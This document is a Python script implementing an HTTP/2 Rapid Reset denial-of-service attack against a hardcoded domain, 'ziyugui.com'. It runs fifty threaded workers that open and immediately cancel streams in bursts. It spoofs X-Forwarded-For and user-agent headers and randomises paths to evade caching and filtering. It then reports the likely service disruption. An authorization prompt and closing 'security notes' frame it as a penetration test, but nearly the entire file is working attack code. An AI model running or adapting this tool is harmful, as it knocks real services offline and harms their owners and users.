import socket
import ssl
import threading
import time
import random
import logging
import sys
import select
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import RemoteSettingsChanged, ConnectionTerminated
from h2.errors import ErrorCodes
from h2.exceptions import ProtocolError, StreamClosedError, TooManyStreamsError

# ===== CONFIGURATION =====
TARGET_DOMAIN = "ziyugui.com"   # MUST USE DOMAIN NOT IP
TARGET_PORT = 443
CONNECTION_POOL_SIZE = 50             # Increased connection pool
MAX_STREAMS_PER_CONNECTION = 1000       # Server's stream limit
STREAMS_PER_BURST = 100                  # Reduced to respect server limits
DURATION = 30                          # Extended test duration
DEBUG_MODE = False                      # Reduced logging for performance
CONNECTION_TIMEOUT = 10                 # Increased timeout
BACKOFF_BASE = 0.1                      # Exponential backoff base
MAX_BACKOFF = 5.0                       # Maximum backoff time
MIN_RECONNECT_DELAY = 0.05              # Minimum reconnect delay
CONNECTION_HEARTBEAT_INTERVAL = 2.0     # Shorter heartbeat interval

# ====== LOGGING SETUP ======
logging.basicConfig(
    level=logging.DEBUG if DEBUG_MODE else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("h2_rapid_reset_enterprise")

# ===== ADVANCED CONNECTION ENGINE =====
class HTTP2ConnectionManager:
    @staticmethod
    def create_secure_connection(domain, port):
        """Create optimized TLS connection with advanced parameters"""
        try:
            # Advanced TLS configuration
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305')
            context.options |= ssl.OP_NO_COMPRESSION
            
            # Conditionally add legacy renegotiation option
            if hasattr(ssl, 'OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'):
                context.options |= ssl.OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
            
            # Socket configuration
            sock = socket.create_connection((domain, port), timeout=CONNECTION_TIMEOUT)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # TLS wrapper with SNI
            tls_sock = context.wrap_socket(
                sock,
                server_hostname=domain,
                do_handshake_on_connect=True
            )
            
            # Verify HTTP/2
            if tls_sock.selected_alpn_protocol() != 'h2':
                logger.error(f"ALPN negotiation failed: {tls_sock.selected_alpn_protocol()}")
                tls_sock.close()
                return None, None
            
            return tls_sock, domain
        except (ssl.SSLError, socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.error(f"Connection failed: {type(e).__name__} - {str(e)}")
            return None, None

    @staticmethod
    def init_http2_connection(tls_sock):
        """Initialize HTTP/2 connection with optimized settings and get server limits"""
        config = H2Configuration(
            client_side=True,
            header_encoding='utf-8',
            validate_outbound_headers=False
        )
        conn = H2Connection(config=config)
        conn.initiate_connection()
        
        # Optimize local settings for rapid reset
        conn.update_settings({
            1: 65536,    # HEADER_TABLE_SIZE
            4: 131072,    # MAX_FRAME_SIZE
            5: 16384      # MAX_HEADER_LIST_SIZE
        })
        
        tls_sock.sendall(conn.data_to_send())
        
        # Get server settings
        max_streams = MAX_STREAMS_PER_CONNECTION
        try:
            # Set timeout for initial settings
            tls_sock.settimeout(2.0)
            data = tls_sock.recv(65536)
            if data:
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, RemoteSettingsChanged):
                        if 3 in event.changed_settings:  # SETTINGS_MAX_CONCURRENT_STREAMS
                            max_streams = event.changed_settings[3].new_value
                            logger.info(f"Server max concurrent streams: {max_streams}")
        except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
            logger.info("Using default max concurrent streams: 100")
        finally:
            tls_sock.settimeout(None)
            
        return conn, max_streams

# ===== CONNECTION HEALTH MANAGER =====
class ConnectionHealthMonitor:
    def __init__(self, connection):
        self.conn = connection
        self.last_activity = time.time()
        self.last_heartbeat = time.time()
        self.connection_active = True
        
    def update_activity(self):
        """Update last activity timestamp"""
        self.last_activity = time.time()
        
    def check_health(self):
        """Check connection health and send ping if needed"""
        # If we already know connection is closed
        if not self.connection_active:
            return False
            
        now = time.time()
        # Check if connection has been inactive too long
        if now - self.last_activity > 10:
            logger.debug("Connection inactive for 10+ seconds")
            return False
            
        # Send heartbeat ping periodically
        if now - self.last_heartbeat > CONNECTION_HEARTBEAT_INTERVAL:
            try:
                self.conn.ping(b'healthck')
                self.last_heartbeat = now
                return True
            except (ProtocolError, ConnectionError):
                self.connection_active = False
                return False
        return True

# ===== STREAM MANAGER =====
class StreamManager:
    def __init__(self, connection, max_streams):
        self.conn = connection
        self.max_streams = max_streams
        self.active_streams = set()
        self.completed_streams = set()
        self.lock = threading.Lock()
        
    def create_stream(self, headers):
        """Create a new stream respecting server limits"""
        with self.lock:
            # Wait until we have available stream slots
            while len(self.active_streams) >= self.max_streams:
                self.process_completions()
                if len(self.active_streams) >= self.max_streams:
                    time.sleep(0.001)
            
            try:
                stream_id = self.conn.get_next_available_stream_id()
                self.conn.send_headers(stream_id, headers, end_stream=False)
                self.active_streams.add(stream_id)
                return stream_id
            except (ProtocolError, StreamClosedError, TooManyStreamsError) as e:
                # Connection is likely closed
                raise ConnectionError(f"Stream creation failed: {str(e)}")
            
    def reset_stream(self, stream_id):
        """Reset a stream and mark it as completed"""
        with self.lock:
            try:
                self.conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)
                if stream_id in self.active_streams:
                    self.active_streams.remove(stream_id)
                self.completed_streams.add(stream_id)
                return True
            except (ProtocolError, StreamClosedError) as e:
                # Connection is broken
                raise ConnectionError(f"Reset stream failed: {str(e)}")
            except Exception:
                return False
                
    def process_completions(self):
        """Clean up completed streams periodically"""
        if len(self.completed_streams) > 1000:
            self.completed_streams.clear()
            
    def active_stream_count(self):
        """Get current active stream count"""
        with self.lock:
            return len(self.active_streams)

# ===== OPTIMIZED ATTACK CORE =====
def rapid_reset_worker(worker_id, domain, port, duration):
    """Advanced connection worker with connection health monitoring"""
    reset_count = 0
    error_count = 0
    start_time = time.time()
    retries = 0
    
    # Main attack loop
    while time.time() < start_time + duration:
        # Connection setup with adaptive retry logic
        tls_sock, used_domain = HTTP2ConnectionManager.create_secure_connection(domain, port)
        if not tls_sock:
            # Calculate backoff with jitter
            backoff = min(BACKOFF_BASE * (2 ** retries), MAX_BACKOFF)
            sleep_time = backoff + random.uniform(0, backoff * 0.3)
            logger.warning(f"Worker {worker_id}: Connection failed, retry {retries} in {sleep_time:.2f}s")
            time.sleep(sleep_time)
            retries = min(retries + 1, 10)  # Cap retries counter
            continue
            
        # Reset retry counter on successful connection
        retries = 0
        conn, max_streams = HTTP2ConnectionManager.init_http2_connection(tls_sock)
        stream_manager = StreamManager(conn, max_streams)
        health_monitor = ConnectionHealthMonitor(conn)
        logger.info(f"Worker {worker_id}: Connection established (Max Streams: {max_streams})")
        
        try:
            # Set socket to non-blocking
            tls_sock.setblocking(False)
            
            # Connection lifetime tracking
            connection_start = time.time()
            last_frame_sent = time.time()
            
            # Main attack loop per connection
            while time.time() < start_time + duration:
                # Validate connection state before proceeding
                if not health_monitor.check_health():
                    logger.warning(f"Worker {worker_id}: Connection unhealthy, reconnecting")
                    break
                    
                # Create headers template
                headers = [
                    (':method', 'GET'),
                    (':path', f'/{random.randint(1000,9999)}?cache={time.time_ns()}'),
                    (':authority', used_domain),
                    (':scheme', 'https'),
                    ('user-agent', f'Mozilla/5.0 ({random.choice(["Windows NT 10.0", "Linux x86_64", "Macintosh"])}'),
                    ('accept', '*/*'),
                    ('cache-control', 'no-store, max-age=0'),
                    ('cookie', f"id={random.getrandbits(128):x}"),
                    ('x-forwarded-for', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"),
                    ('accept-language', random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7']))
                ]
                
                # Create streams with state validation
                stream_ids = []
                for _ in range(min(STREAMS_PER_BURST, max_streams)):
                    try:
                        if not health_monitor.check_health():
                            logger.warning(f"Worker {worker_id}: Connection closed during stream creation")
                            break
                            
                        stream_id = stream_manager.create_stream(headers)
                        stream_ids.append(stream_id)
                        health_monitor.update_activity()
                    except ConnectionError as e:
                        logger.warning(f"Worker {worker_id}: {str(e)}")
                        error_count += 1
                        break
                    except Exception as e:
                        logger.error(f"Worker {worker_id}: Stream error - {str(e)}")
                        error_count += 1
                        break
                
                # Immediately reset streams with state validation
                for stream_id in stream_ids:
                    if not health_monitor.check_health():
                        logger.warning(f"Worker {worker_id}: Connection closed during stream reset")
                        break
                        
                    try:
                        if stream_manager.reset_stream(stream_id):
                            reset_count += 1
                            health_monitor.update_activity()
                        else:
                            error_count += 1
                    except ConnectionError as e:
                        logger.warning(f"Worker {worker_id}: {str(e)}")
                        error_count += 1
                        break
                
                # Send batched frames
                try:
                    if not health_monitor.connection_active:
                        logger.warning(f"Worker {worker_id}: Connection closed before send")
                        break
                        
                    data = conn.data_to_send()
                    if data:
                        tls_sock.sendall(data)
                        last_frame_sent = time.time()
                except (BrokenPipeError, ConnectionResetError, ssl.SSLEOFError) as e:
                    logger.warning(f"Worker {worker_id}: Connection broken - {str(e)}")
                    break
                except (BlockingIOError, ssl.SSLWantWriteError):
                    # Temporary buffer full - skip this burst but keep connection
                    logger.debug(f"Worker {worker_id}: Socket buffer full, skipping burst")
                    error_count += 1
                    time.sleep(0.01)
                    continue
                except OSError as e:
                    if e.errno in (9, 107):  # EBADF, ENOTCONN
                        logger.warning(f"Worker {worker_id}: Socket error - {str(e)}")
                        break
                    else:
                        raise
                
                # Check if we're making progress
                if time.time() - last_frame_sent > 5:
                    logger.warning(f"Worker {worker_id}: No frames sent for 5 seconds, reconnecting")
                    break
                
                # Adaptive throttling based on connection health
                active_streams = stream_manager.active_stream_count()
                throttle_factor = max(0.2, min(1.0, (max_streams - active_streams) / max_streams))
                sleep_time = max(0.001, random.expovariate(1.0/(0.05 * throttle_factor)))
                time.sleep(sleep_time)
                
                # Process incoming data to prevent connection termination
                try:
                    data = b''
                    while True:
                        try:
                            chunk = tls_sock.recv(65536)
                            if not chunk:
                                break
                            data += chunk
                            health_monitor.update_activity()
                        except ssl.SSLWantReadError:
                            break
                        except BlockingIOError:
                            break
                        except OSError as e:
                            if e.errno in (9, 107):  # EBADF, ENOTCONN
                                break
                            else:
                                raise
                    
                    if data:
                        events = conn.receive_data(data)
                        for event in events:
                            if isinstance(event, ConnectionTerminated):
                                logger.error(f"Worker {worker_id}: Connection terminated - Error: {event.error_code}")
                                health_monitor.connection_active = False
                except Exception as e:
                    logger.error(f"Worker {worker_id}: Data processing error - {str(e)}")
            
        except (ConnectionError, ConnectionAbortedError) as e:
            logger.warning(f"Worker {worker_id}: Connection aborted - {str(e)}")
        except Exception as e:
            logger.error(f"Worker {worker_id}: Runtime error - {str(e)}")
            error_count += 1
        finally:
            try:
                tls_sock.close()
            except:
                pass
            
            # Calculate reconnect delay based on connection lifetime
            connection_duration = time.time() - connection_start
            reconnect_delay = max(MIN_RECONNECT_DELAY, min(1.0, 0.5 - (connection_duration / 10)))
            time.sleep(reconnect_delay)
    
    active_duration = time.time() - start_time
    success_rate = reset_count / (reset_count + error_count) * 100 if reset_count + error_count > 0 else 0
    logger.info(f"Worker {worker_id}: Completed - {reset_count} resets, {error_count} errors ({success_rate:.1f}% success) in {active_duration:.2f}s")
    return reset_count, error_count, active_duration

# ===== MAIN EXECUTION =====
if __name__ == "__main__":
    # Authorization checkpoint
    print("[!] WARNING: THIS TOOL MAY CAUSE SERVICE DISRUPTION")
    print("[!] DO NOT RUN WITHOUT EXPLICIT AUTHORIZATION")
    if input("[!] CONFIRM AUTHORIZATION FOR PENETRATION TEST (Y/N): ").lower() != "y":
        sys.exit(0)
    
    print(f"[*] Starting ENTERPRISE HTTP/2 Rapid Reset test against {TARGET_DOMAIN}")
    print(f"[*] Parameters: {CONNECTION_POOL_SIZE} workers, {STREAMS_PER_BURST} streams/burst, {DURATION}s duration")
    
    # Run workers
    start_time = time.time()
    threads = []
    results = []
    stats_lock = threading.Lock()
    active_workers = CONNECTION_POOL_SIZE
    
    def worker_wrapper(worker_id):
        try:
            result = rapid_reset_worker(worker_id, TARGET_DOMAIN, TARGET_PORT, DURATION)
            with stats_lock:
                results.append(result)
        except Exception as e:
            logger.error(f"Worker {worker_id} crashed: {str(e)}")
            with stats_lock:
                results.append((0, 1, 0))
        finally:
            with stats_lock:
                active_workers -= 1
    
    for i in range(CONNECTION_POOL_SIZE):
        t = threading.Thread(target=worker_wrapper, args=(i+1,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(random.uniform(0.1, 0.5))  # Randomized connection staggering
    
    # Progress monitoring
    print("\n[+] Attack progress:\n")
    last_update = time.time()
    while active_workers > 0:
        time.sleep(1)
        elapsed = time.time() - start_time
        with stats_lock:
            completed = CONNECTION_POOL_SIZE - active_workers
            total_resets = sum(r[0] for r in results)
            total_errors = sum(r[1] for r in results)
        
        # Update every 3 seconds
        if time.time() - last_update > 3 or active_workers == 0:
            rate = total_resets / elapsed if elapsed > 0 else 0
            success_rate = total_resets / (total_resets + total_errors) * 100 if total_resets + total_errors > 0 else 0
            print(f"\r[+] Elapsed: {elapsed:.1f}s | Workers: {active_workers}/{CONNECTION_POOL_SIZE} | "
                  f"RSTs: {total_resets} | Errors: {total_errors} | "
                  f"Rate: {rate:.1f}/s | Success: {success_rate:.1f}%", end="")
            sys.stdout.flush()
            last_update = time.time()
    
    # Final statistics
    total_duration = time.time() - start_time
    with stats_lock:
        total_resets = sum(r[0] for r in results)
        total_errors = sum(r[1] for r in results)
    
    success_rate = total_resets / (total_resets + total_errors) * 100 if total_resets + total_errors > 0 else 0
    print("\n\n[+] Attack completed")
    print(f"    Total RST_STREAM frames: {total_resets}")
    print(f"    Total errors: {total_errors}")
    print(f"    Success rate: {success_rate:.1f}%")
    print(f"    Test duration: {total_duration:.2f} seconds")
    if total_duration > 0:
        rate = total_resets / total_duration
        print(f"    Average rate: {rate:.1f} resets/sec")
    
    # Impact assessment
    if total_resets > 2000000:
        print("[!] POTENTIAL IMPACT: CRITICAL (Service disruption almost certain)")
    elif total_resets > 1000000:
        print("[!] POTENTIAL IMPACT: HIGH (Service disruption likely)")
    elif total_resets > 500000:
        print("[!] POTENTIAL IMPACT: MEDIUM (Performance degradation probable)")
    elif total_resets > 100000:
        print("[!] POTENTIAL IMPACT: LOW (Minimal effect detected)")
    else:
        print("[!] POTENTIAL IMPACT: NONE (Check configuration/firewalls)")

# ==== SECURITY NOTES ====
# CRITICAL REQUIREMENTS:
# 1. MUST have written authorization from system owner
# 2. MUST coordinate with operations team for emergency rollback
# 3. MUST use dedicated test environment for initial validation
# 4. MUST implement network monitoring to prevent collateral damage
# 5. MUST schedule during approved maintenance windows only




